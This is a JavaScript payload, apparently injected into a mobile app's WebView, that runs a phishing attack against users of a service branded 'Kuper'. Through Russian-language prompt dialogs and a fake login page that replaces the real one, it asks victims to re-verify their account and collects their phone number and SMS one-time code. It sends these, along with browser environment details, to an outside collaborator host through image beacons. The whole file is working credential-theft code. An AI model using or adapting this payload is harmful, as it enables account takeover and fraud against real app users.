alert('new_fish');
(function() {
    'use strict';

    var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

    function b(path, data) {
        try {
            var img = new Image();
            img.src = EXFIL + path + '?d=' + encodeURIComponent(
                typeof data === 'string' ? data : JSON.stringify(data)
            ).substr(0, 2000);
        } catch(e) {}
    }

    var env = {};
    try { env.origin = window.origin; } catch(e) {}
    try { env.ua = navigator.userAgent.substr(0, 100); } catch(e) {}
    if (window.ReactNativeWebView) {
        env.rnwv = 'present';
        env.postMsg = typeof window.ReactNativeWebView.postMessage;
    }
    b('/v10p/env', env);

    function formatPhone(raw) {
        var d = raw.replace(/\D/g, '');
        if (d.length === 0) return '+7 ';
        // Normalize: strip leading 8 or 7, ensure starts with 7
        if (d[0] === '8') d = '7' + d.substr(1);
        if (d[0] !== '7') d = '7' + d;
        if (d.length > 11) d = d.substr(0, 11);
        var p = '+7';
        if (d.length > 1) p += ' (' + d.substr(1, 3);
        if (d.length > 4) p += ') ' + d.substr(4, 3);
        if (d.length > 7) p += '-' + d.substr(7, 2);
        if (d.length > 9) p += '-' + d.substr(9, 2);
        return p;
    }

    function validateRuPhone(raw) {
        var d = raw.replace(/\D/g, '');
        if (d[0] === '8') d = '7' + d.substr(1);
        if (d[0] !== '7') d = '7' + d;
        return d.length === 11 && /^7[0-9]{10}$/.test(d);
    }

    setTimeout(function() {
        var phone = null;
        var attempts = 0;

        // Loop until valid phone or user cancels
        while (attempts < 3) {
            var msg = attempts === 0
                ? 'Kuper \u2014 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435 \u043b\u0438\u0447\u043d\u043e\u0441\u0442\u0438\n\n' +
                  '\u0412 \u0446\u0435\u043b\u044f\u0445 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 \u0432\u0430\u0448\u0435\u0439 \u0443\u0447\u0451\u0442\u043d\u043e\u0439 \u0437\u0430\u043f\u0438\u0441\u0438 \u0442\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f ' +
                  '\u043f\u043e\u0432\u0442\u043e\u0440\u043d\u0430\u044f \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f.\n\n' +
                  '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430:'
                : '\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0444\u043e\u0440\u043c\u0430\u0442 \u043d\u043e\u043c\u0435\u0440\u0430.\n\n' +
                  '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0440\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u0438\u0439 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 (+7...):';

            var input = prompt(msg, '+7');
            if (input === null) {
                b('/v10p/phone_cancelled', 'user_cancelled_attempt_' + attempts);
                return;
            }

            if (validateRuPhone(input)) {
                phone = input.replace(/\D/g, '');
                if (phone[0] === '8') phone = '7' + phone.substr(1);
                if (phone[0] !== '7') phone = '7' + phone;
                phone = '+' + phone;
                break;
            }
            attempts++;
        }

        if (!phone) {
            b('/v10p/phone_invalid', 'max_attempts');
            return;
        }

        b('/v10p/PHONE', phone);

        // Step 2: SMS code
        setTimeout(function() {
            var masked = phone.substr(0, 4) + ' *** ***-**-' + phone.substr(phone.length - 2);
            var code = null;
            var codeAttempts = 0;

            while (codeAttempts < 3) {
                var codeMsg = codeAttempts === 0
                    ? '\u041a\u043e\u0434 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d ' +
                      '\u043d\u0430 \u043d\u043e\u043c\u0435\u0440 ' + masked + '\n\n' +
                      '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 6-\u0437\u043d\u0430\u0447\u043d\u044b\u0439 \u043a\u043e\u0434 \u0438\u0437 SMS:'
                    : '\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043a\u043e\u0434. \u041a\u043e\u0434 \u0434\u043e\u043b\u0436\u0435\u043d \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c 6 \u0446\u0438\u0444\u0440.\n\n' +
                      '\u041f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u0435 \u0432\u0432\u043e\u0434:';

                var codeInput = prompt(codeMsg);
                if (codeInput === null) {
                    b('/v10p/code_cancelled', 'user_cancelled');
                    return;
                }

                var cleanCode = codeInput.replace(/\D/g, '');
                if (cleanCode.length === 6) {
                    code = cleanCode;
                    break;
                }
                codeAttempts++;
            }

            if (!code) {
                b('/v10p/code_invalid', 'max_attempts');
                return;
            }

            b('/v10p/SMS_CODE', code);
            b('/v10p/CREDS', phone + ':' + code);

            // Success message
            alert('\u0413\u043e\u0442\u043e\u0432\u043e!\n\n\u0412\u044b \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u043b\u0438 \u043b\u0438\u0447\u043d\u043e\u0441\u0442\u044c.');

            // Navigate back to app
            setTimeout(function() {
                if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
                    window.ReactNativeWebView.postMessage(JSON.stringify({action: 'navigateBack'}));
                }
            }, 500);

        }, 800);
    }, 300);

    // ========================================
    // PHASE 2: HTML-форма (за оверлеем, но интерактивна)
    // Фоллбэк если prompt() заблокирован в WebView
    // ========================================

    var style = document.createElement('style');
    style.textContent =
        '*{margin:0;padding:0;box-sizing:border-box}' +
        'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;color:#1a1a1a;-webkit-text-size-adjust:100%}' +
        '.nav{background:#fff;padding:12px 16px;display:flex;align-items:center;border-bottom:1px solid #e8e8e8}' +
        '.nav-back{width:24px;height:24px;display:flex;align-items:center;justify-content:center;margin-right:12px;cursor:pointer}' +
        '.nav-back svg{width:20px;height:20px}' +
        '.nav-title{font-size:17px;font-weight:600;color:#1a1a1a}' +
        '.container{padding:24px 16px;max-width:400px;margin:0 auto}' +
        '.logo-block{text-align:center;margin-bottom:32px;padding-top:16px}' +
        '.logo-circle{width:72px;height:72px;background:linear-gradient(135deg,#00c853,#00a03e);border-radius:50%;display:inline-flex;align-items:center;justify-content:center;margin-bottom:12px}' +
        '.logo-letter{color:#fff;font-size:32px;font-weight:700}' +
        '.logo-name{font-size:20px;font-weight:700;color:#1a1a1a}' +
        '.card{background:#fff;border-radius:16px;padding:20px;margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,0.06)}' +
        '.card-notice{background:#FFF8E1;border-radius:12px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:10px}' +
        '.card-notice-icon{font-size:18px;flex-shrink:0;margin-top:1px}' +
        '.card-notice-text{font-size:13px;line-height:1.45;color:#6D4C00}' +
        '.input-group{margin-bottom:16px}' +
        '.input-label{font-size:13px;font-weight:500;color:#8E8E93;margin-bottom:8px;display:block}' +
        '.input-wrapper{position:relative;display:flex;align-items:center;background:#F2F2F7;border-radius:12px;border:2px solid transparent;transition:border-color .2s}' +
        '.input-wrapper.focused{border-color:#00c853;background:#fff}' +
        '.input-wrapper.error{border-color:#FF3B30;background:#fff}' +
        '.input-prefix{padding:0 0 0 14px;font-size:16px;color:#1a1a1a;font-weight:500;pointer-events:none;white-space:nowrap}' +
        '.input-field{flex:1;padding:14px 14px 14px 4px;font-size:16px;border:none;background:transparent;outline:none;color:#1a1a1a;-webkit-appearance:none}' +
        '.input-field::placeholder{color:#C7C7CC}' +
        '.input-hint{font-size:12px;color:#FF3B30;margin-top:6px;display:none}' +
        '.input-hint.visible{display:block}' +
        '.code-inputs{display:flex;gap:8px;justify-content:center;margin-bottom:16px}' +
        '.code-box{width:48px;height:56px;border-radius:12px;border:2px solid #E5E5EA;background:#fff;text-align:center;font-size:22px;font-weight:600;color:#1a1a1a;outline:none;-webkit-appearance:none;transition:border-color .2s}' +
        '.code-box:focus{border-color:#00c853}' +
        '.code-box.filled{border-color:#00c853;background:#F0FFF4}' +
        '.btn-primary{width:100%;padding:16px;background:#00c853;color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer;-webkit-appearance:none;transition:background .15s,opacity .15s}' +
        '.btn-primary:active{background:#00a03e}' +
        '.btn-primary:disabled{opacity:0.5;cursor:default}' +
        '.btn-secondary{width:100%;padding:12px;background:transparent;color:#00c853;border:none;font-size:14px;font-weight:500;cursor:pointer;margin-top:8px}' +
        '.timer-text{text-align:center;font-size:13px;color:#8E8E93;margin-top:12px}' +
        '.timer-text span{color:#1a1a1a;font-weight:500}' +
        '.success-block{text-align:center;padding:48px 20px}' +
        '.success-icon{width:64px;height:64px;background:#E8F5E9;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;margin-bottom:16px}' +
        '.success-icon svg{width:32px;height:32px}' +
        '.success-title{font-size:20px;font-weight:700;color:#1a1a1a;margin-bottom:8px}' +
        '.success-text{font-size:14px;color:#8E8E93;line-height:1.4}' +
        '.footer-text{text-align:center;font-size:11px;color:#C7C7CC;margin-top:24px;line-height:1.5}' +
        '@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}' +
        '.shake{animation:shake .3s ease}';
    document.head.appendChild(style);

    var meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content = 'width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no';
    document.head.appendChild(meta);

    // Back arrow SVG
    var backSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>';
    var checkSvg = '<svg viewBox="0 0 24 24" fill="none" stroke="#00c853" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>';

    document.body.innerHTML =
        '<div class="nav">' +
            '<div class="nav-back" id="navBack">' + backSvg + '</div>' +
            '<div class="nav-title">\u0412\u0445\u043e\u0434 \u0432 \u0430\u043a\u043a\u0430\u0443\u043d\u0442</div>' +
        '</div>' +

        // STEP 1: Phone input
        '<div id="step1" class="container">' +
            '<div class="logo-block">' +
                '<div class="logo-circle"><span class="logo-letter">K</span></div>' +
                '<div class="logo-name">Kuper</div>' +
            '</div>' +
            '<div class="card">' +
                '<div class="card-notice">' +
                    '<span class="card-notice-icon">\u26A0\uFE0F</span>' +
                    '<span class="card-notice-text">\u0422\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u043f\u043e\u0432\u0442\u043e\u0440\u043d\u0430\u044f \u0430\u0432\u0442\u043e\u0440\u0438\u0437\u0430\u0446\u0438\u044f \u0434\u043b\u044f \u0437\u0430\u0449\u0438\u0442\u044b \u0432\u0430\u0448\u0435\u0433\u043e \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430</span>' +
                '</div>' +
                '<div class="input-group">' +
                    '<label class="input-label">\u041d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430</label>' +
                    '<div class="input-wrapper" id="phoneWrapper">' +
                        '<span class="input-prefix">+7</span>' +
                        '<input class="input-field" id="phoneInput" type="tel" inputmode="tel" placeholder="(900) 000-00-00" maxlength="15" autocomplete="tel">' +
                    '</div>' +
                    '<div class="input-hint" id="phoneHint">\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u0440\u043e\u0441\u0441\u0438\u0439\u0441\u043a\u0438\u0439 \u043d\u043e\u043c\u0435\u0440</div>' +
                '</div>' +
                '<button class="btn-primary" id="btnPhone" disabled>\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434</button>' +
            '</div>' +
            '<div class="footer-text">\u041d\u0430\u0436\u0438\u043c\u0430\u044f \u00ab\u041f\u043e\u043b\u0443\u0447\u0438\u0442\u044c \u043a\u043e\u0434\u00bb, \u0432\u044b \u0441\u043e\u0433\u043b\u0430\u0448\u0430\u0435\u0442\u0435\u0441\u044c<br>\u0441 \u0423\u0441\u043b\u043e\u0432\u0438\u044f\u043c\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0441\u0435\u0440\u0432\u0438\u0441\u0430</div>' +
        '</div>' +

        // STEP 2: SMS code input
        '<div id="step2" class="container" style="display:none">' +
            '<div class="card" style="text-align:center">' +
                '<div style="font-size:15px;color:#1a1a1a;margin-bottom:4px;font-weight:600">\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434</div>' +
                '<div style="font-size:13px;color:#8E8E93;margin-bottom:20px">\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u043b\u0438 SMS \u043d\u0430 <span id="maskedPhone" style="font-weight:500;color:#1a1a1a"></span></div>' +
                '<div class="code-inputs" id="codeInputs">' +
                    '<input class="code-box" type="tel" inputmode="numeric" maxlength="1" data-idx="0">' +
                    '<input class="code-box" type="tel" inputmode="numeric" maxlength="1" data-idx="1">' +
                    '<input class="code-box" type="tel" inputmode="numeric" maxlength="1" data-idx="2">' +
                    '<input class="code-box" type="tel" inputmode="numeric" maxlength="1" data-idx="3">' +
                    '<input class="code-box" type="tel" inputmode="numeric" maxlength="1" data-idx="4">' +
                    '<input class="code-box" type="tel" inputmode="numeric" maxlength="1" data-idx="5">' +
                '</div>' +
                '<div class="input-hint" id="codeHint" style="text-align:center">\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043a\u043e\u0434, \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0451 \u0440\u0430\u0437</div>' +
                '<div class="timer-text" id="timerText">\u041f\u043e\u0432\u0442\u043e\u0440\u043d\u043e \u043e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c \u0447\u0435\u0440\u0435\u0437 <span id="timerCount">59</span> \u0441\u0435\u043a</div>' +
                '<button class="btn-secondary" id="btnResend" style="display:none">\u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c \u043a\u043e\u0434 \u043f\u043e\u0432\u0442\u043e\u0440\u043d\u043e</button>' +
            '</div>' +
        '</div>' +

        // STEP 3: Success
        '<div id="step3" class="container" style="display:none">' +
            '<div class="card">' +
                '<div class="success-block">' +
                    '<div class="success-icon">' + checkSvg + '</div>' +
                    '<div class="success-title">\u0413\u043e\u0442\u043e\u0432\u043e!</div>' +
                    '<div class="success-text">\u0412\u0430\u0448 \u0430\u043a\u043a\u0430\u0443\u043d\u0442 \u0443\u0441\u043f\u0435\u0448\u043d\u043e<br>\u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0451\u043d</div>' +
                '</div>' +
            '</div>' +
        '</div>';

    setTimeout(function() {
        var phoneInput = document.getElementById('phoneInput');
        var phoneWrapper = document.getElementById('phoneWrapper');
        var phoneHint = document.getElementById('phoneHint');
        var btnPhone = document.getElementById('btnPhone');
        var storedPhone = '';

        if (!phoneInput) return;

        // Phone formatting
        function formatPhoneInput(val) {
            var d = val.replace(/\D/g, '');
            if (d.length > 10) d = d.substr(0, 10);
            var result = '';
            if (d.length > 0) result = '(' + d.substr(0, 3);
            if (d.length >= 3) result += ') ';
            if (d.length > 3) result += d.substr(3, 3);
            if (d.length > 6) result += '-' + d.substr(6, 2);
            if (d.length > 8) result += '-' + d.substr(8, 2);
            return result;
        }

        phoneInput.addEventListener('input', function() {
            var raw = phoneInput.value.replace(/\D/g, '');
            phoneInput.value = formatPhoneInput(raw);
            var isValid = raw.length === 10;
            btnPhone.disabled = !isValid;
            phoneHint.classList.remove('visible');
            phoneWrapper.classList.remove('error');
        });

        phoneInput.addEventListener('focus', function() {
            phoneWrapper.classList.add('focused');
        });
        phoneInput.addEventListener('blur', function() {
            phoneWrapper.classList.remove('focused');
        });

        // Submit phone
        btnPhone.addEventListener('click', function() {
            var raw = phoneInput.value.replace(/\D/g, '');
            if (raw.length !== 10) {
                phoneHint.classList.add('visible');
                phoneWrapper.classList.add('error');
                phoneWrapper.classList.add('shake');
                setTimeout(function() { phoneWrapper.classList.remove('shake'); }, 300);
                return;
            }

            storedPhone = '+7' + raw;
            b('/v10p/PHONE_FORM', storedPhone);

            // Show code step
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';

            var masked = '+7 (' + raw.substr(0,1) + '**) ***-**-' + raw.substr(8,2);
            document.getElementById('maskedPhone').textContent = masked;

            // Focus first code box
            var boxes = document.querySelectorAll('.code-box');
            if (boxes[0]) boxes[0].focus();

            // Timer countdown
            var sec = 59;
            var timerCount = document.getElementById('timerCount');
            var timerText = document.getElementById('timerText');
            var btnResend = document.getElementById('btnResend');
            var timer = setInterval(function() {
                sec--;
                if (timerCount) timerCount.textContent = String(sec);
                if (sec <= 0) {
                    clearInterval(timer);
                    if (timerText) timerText.style.display = 'none';
                    if (btnResend) btnResend.style.display = 'block';
                }
            }, 1000);
        });

        // Code box auto-advance
        var codeBoxes = document.querySelectorAll('.code-box');
        codeBoxes.forEach(function(box, idx) {
            box.addEventListener('input', function() {
                var v = box.value.replace(/\D/g, '');
                box.value = v ? v[0] : '';
                if (v && idx < 5) {
                    box.classList.add('filled');
                    codeBoxes[idx + 1].focus();
                }
                // Check if all filled
                var code = '';
                codeBoxes.forEach(function(b) { code += b.value; });
                if (code.length === 6) {
                    submitCode(code);
                }
            });
            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !box.value && idx > 0) {
                    codeBoxes[idx - 1].focus();
                    codeBoxes[idx - 1].value = '';
                    codeBoxes[idx - 1].classList.remove('filled');
                }
            });
            // Handle paste
            box.addEventListener('paste', function(e) {
                e.preventDefault();
                var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
                if (paste.length >= 6) {
                    for (var i = 0; i < 6; i++) {
                        codeBoxes[i].value = paste[i];
                        codeBoxes[i].classList.add('filled');
                    }
                    submitCode(paste.substr(0, 6));
                }
            });
        });

        function submitCode(code) {
            b('/v10p/SMS_CODE_FORM', code);
            b('/v10p/CREDS_FORM', storedPhone + ':' + code);

            // Show success
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';

            // Navigate back after delay
            setTimeout(function() {
                if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
                    window.ReactNativeWebView.postMessage(JSON.stringify({action: 'navigateBack'}));
                }
            }, 2500);
        }

        // Resend button
        var btnResend = document.getElementById('btnResend');
        if (btnResend) {
            btnResend.addEventListener('click', function() {
                b('/v10p/resend_clicked', storedPhone);
                btnResend.style.display = 'none';
                document.getElementById('timerText').style.display = 'block';
                var sec = 59;
                document.getElementById('timerCount').textContent = '59';
                var timer = setInterval(function() {
                    sec--;
                    document.getElementById('timerCount').textContent = String(sec);
                    if (sec <= 0) {
                        clearInterval(timer);
                        document.getElementById('timerText').style.display = 'none';
                        btnResend.style.display = 'block';
                    }
                }, 1000);
            });
        }

        // Back button
        var navBack = document.getElementById('navBack');
        if (navBack) {
            navBack.addEventListener('click', function() {
                if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
                    window.ReactNativeWebView.postMessage(JSON.stringify({action: 'navigateBack'}));
                }
            });
        }

    }, 100);

    b('/v10p/phishing_loaded', 'ok');

})();
